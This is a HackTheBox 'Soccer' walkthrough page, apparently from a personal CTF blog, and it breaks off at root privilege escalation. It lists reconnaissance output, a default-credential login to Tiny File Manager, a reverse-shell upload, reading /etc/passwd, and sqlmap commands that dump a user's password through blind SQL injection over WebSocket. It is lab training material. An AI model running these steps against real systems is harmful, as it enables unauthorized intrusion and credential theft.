@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HackTheBox Soccer // 0x53CTF</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.108.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="5YC10P5" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Soccer"/>
+<meta name="twitter:description" content="Name: Soccer IP: 10.10.11.194 Defficulty: Easy OS: Linux Author: sau123 Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG&#43;9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6&#43;N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0&#43;aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0= | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD&#43;EqFcmc0ngWeRLfCr68&#43;uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk= | 256 5797565def793c2fcbdb35fff17c615c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/ 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1."/>
+
+    <meta property="og:title" content="HackTheBox Soccer" />
+<meta property="og:description" content="Name: Soccer IP: 10.10.11.194 Defficulty: Easy OS: Linux Author: sau123 Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG&#43;9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6&#43;N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0&#43;aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0= | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD&#43;EqFcmc0ngWeRLfCr68&#43;uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk= | 256 5797565def793c2fcbdb35fff17c615c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/ 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://53ctf.github.io/posts/htb/soccer/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-17T14:51:19+05:30" />
+<meta property="article:modified_time" content="2023-01-17T14:51:19+05:30" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
+      <span class="app-header-title">0x53CTF</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>HackTheBox</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox Soccer</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 17, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://53ctf.github.io/tags/hackthebox/">HackTheBox</a>
+              <a class="tag" href="https://53ctf.github.io/tags/sqlinjection/">SQLInjection</a>
+              <a class="tag" href="https://53ctf.github.io/tags/websockets/">WebSockets</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <ul>
+<li>Name: Soccer</li>
+<li>IP: 10.10.11.194</li>
+<li>Defficulty: Easy</li>
+<li>OS: Linux</li>
+<li>Author: <a href="https://www.hackthebox.com/home/users/profile/201596">sau123</a></li>
+</ul>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE         REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> ad0d84a3fdcc98a478fef94915dae16d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> dfd6a39f68269dfc7c6a0c29e961f00c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5797565def793c2fcbdb35fff17c615c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
+</span></span><span style="display:flex;"><span>80/tcp   open  http            syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://soccer.htb/
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>9091/tcp open  xmltec-xmlmail? syn-ack
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   GetRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
+</span></span><span style="display:flex;"><span>|     Content-Security-Policy: default-src <span style="color:#e6db74">&#39;none&#39;</span>
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">139</span>
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">17</span> Jan <span style="color:#ae81ff">2023</span> 09:24:28 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/html&gt;
+</span></span><span style="display:flex;"><span>|   HTTPOptions, RTSPRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
+</span></span><span style="display:flex;"><span>|     Content-Security-Policy: default-src <span style="color:#e6db74">&#39;none&#39;</span>
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">143</span>
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">17</span> Jan <span style="color:#ae81ff">2023</span> 09:24:29 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Keyspace</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Three ports are open.</p>
+<ul>
+<li><strong>22/TCP SSH</strong>
+<ul>
+<li>OpenSSH 8.2p1</li>
+<li>And its banner says that this is a <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5">Ubuntu</a> box</li>
+</ul>
+</li>
+<li><strong>80/TCP HTTP</strong>
+<ul>
+<li>nginx 1.18.0</li>
+<li>Add <code>soccer.htb</code> into <code>/etc/hosts</code></li>
+</ul>
+</li>
+<li><strong>9091/TCP</strong></li>
+</ul>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p><code>http://soccer.htb/</code> is just an static website.</p>
+<h3 id="directory-fuzzing">Directory Fuzzing</h3>
+<p>Found two interesting directories.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -c -recursion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tiny                    <span style="color:#f92672">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 210ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Starting queued job on target: http://soccer.htb/tiny/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uploads                 <span style="color:#f92672">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 224ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><code>http://soccer.htb/tiny</code> is a login form for <a href="https://tinyfilemanager.github.io/">Tiny File Manager</a>. If we look into the page source code, we can find the version of the Tiny File Manager.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://tinyfilemanager.github.io/&#34;</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_blank&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-muted&#34;</span> <span style="color:#a6e22e">data-version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.4.3&#34;</span>&gt;CCP Programmers&lt;/<span style="color:#f92672">a</span>&gt; &amp;mdash;&amp;mdash;
+</span></span></code></pre></div><p>Since we don&rsquo;t have any credentials yet, let&rsquo;s try to find and use default credentials to authenticate.</p>
+<p>And we can login as the <code>admin</code> user with default credentials.
+<code>admin:admin@123</code></p>
+<h2 id="foothold">Foothold</h2>
+<p>After login, we can see that now we can upload files to the webroot. Let&rsquo;s try to upload a <code>php-reverse-shell.php</code> file and try to get reverse shell.</p>
+<p>Upload the <code>shell.php</code> to the upload directory from the Tiny File Manager.
+Start a reverse connection listener. And then navigate to the <a href="http://soccer.htb/tiny/uploads/shell.php">http://soccer.htb/tiny/uploads/shell.php</a>.</p>
+<p>And we got a shell as the <code>www-data</code> user.</p>
+<h2 id="privesc-player">Privesc [Player]</h2>
+<p>Looks like we have one user called <code>player</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@soccer:/$ cat /etc/passwd | grep sh
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>player:x:1001:1001::/home/player:/bin/bash
+</span></span></code></pre></div><p>If we view the <code>/etc/nginx/sites-available/soc-player.htb</code>, we can see thats custom subdomain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@soccer:/etc/nginx/sites-enabled$ cat /etc/nginx/sites-available/soc-player.htb
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        listen 80;
+</span></span><span style="display:flex;"><span>        listen <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:80;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        server_name soc-player.soccer.htb;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        root /root/app/views;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location / <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                proxy_pass http://localhost:3000;
+</span></span><span style="display:flex;"><span>                proxy_http_version 1.1;
+</span></span><span style="display:flex;"><span>                proxy_set_header Upgrade $http_upgrade;
+</span></span><span style="display:flex;"><span>                proxy_set_header Connection <span style="color:#e6db74">&#39;upgrade&#39;</span>;
+</span></span><span style="display:flex;"><span>                proxy_set_header Host $host;
+</span></span><span style="display:flex;"><span>                proxy_cache_bypass $http_upgrade;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>So let&rsquo;s add <code>soc-player.soccer.htb</code> into our <code>/etc/hosts</code> file.</p>
+<p>Go to <code>http://soc-player.soccer.htb/</code> and create an account.
+While looking at the page source, I saw this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#e6db74">&#34;ws://soc-player.soccer.htb:9091&#34;</span>);
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">btn</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;btn&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">input</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;id&#39;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;connected to the server&#39;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;keypress&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">keyOne</span>(<span style="color:#a6e22e">e</span>)
+</span></span><span style="display:flex;"><span>        });
+</span></span></code></pre></div><p>In <code>http://soc-player.soccer.htb/check</code> we can check our ticket numbers validity. So let&rsquo;s intercept the reqest from the BurpSuite and see whats going.</p>
+<p>When we send our accual ticket number, it says <code>Ticket Exists</code> and if send some random garbage, it says <code>Ticket Doesn't Exist</code>. So let&rsquo;s find the vulnerability here.</p>
+<p>After a while, I found a Blind SQL Injection.<br>
+<img src="images/2.png" alt="SQLi">
+Once we send an invalid <code>id</code> with a SQLi payload, it says <code>Ticket Exists</code>.</p>
+<p>Since we are dealing with <a href="https://en.wikipedia.org/wiki/WebSocket">WebSockets</a> here, let&rsquo;s find a way to do <strong>SQL injection over WebSocket</strong>.</p>
+<p>After some time, I found this article about <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a>.</p>
+<p>Using that python script, we can exploit SQLi over websockets.</p>
+<p>Modify the script according to our needs and run it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; python3 script.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting MiddleWare Server
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send payloads in http://localhost:8081/?id<span style="color:#f92672">=</span>*
+</span></span></code></pre></div><p>Now we can run sqlmap as follows.<br>
+<em>(This is going to take a long time to process. So go get a coffee or something before we begin the attack)</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; sqlmap -u http://localhost:8081/?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --batch --dbs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>available databases <span style="color:#f92672">[</span>5<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mysql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> soccer_db
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sys
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; sqlmap -u http://localhost:8081/?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --batch -D soccer_db --tables
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database: soccer_db
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> table<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----------+
+</span></span><span style="display:flex;"><span>| accounts |
+</span></span><span style="display:flex;"><span>+----------+
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; sqlmap -u http://localhost:8081/?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -D soccer_db -T accounts --dump
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+------+-------------------+----------------------+----------+
+</span></span><span style="display:flex;"><span>| id   | email             | password             | username |
+</span></span><span style="display:flex;"><span>+------+-------------------+----------------------+----------+
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1324</span> | player@player.htb | PlayerOftheMatch2022 | player   |
+</span></span><span style="display:flex;"><span>+------+-------------------+----------------------+----------+
+</span></span></code></pre></div><p>Login to the box as the user <code>player</code> and capture the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>player@soccer:~$ whoami
+</span></span><span style="display:flex;"><span>player
+</span></span><span style="display:flex;"><span>player@soccer:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>player<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>player<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>player<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>player@soccer:~$ cat user.txt
+</span></span><span style="display:flex;"><span>d3e**************************f33
+</span></span></code></pre></div><h2 id="privesc-root">Privesc [Root]</h2>
+<p>If we look for SUID binaries, we can notice <code>/usr/bin/doas</code> is showing up.</p>
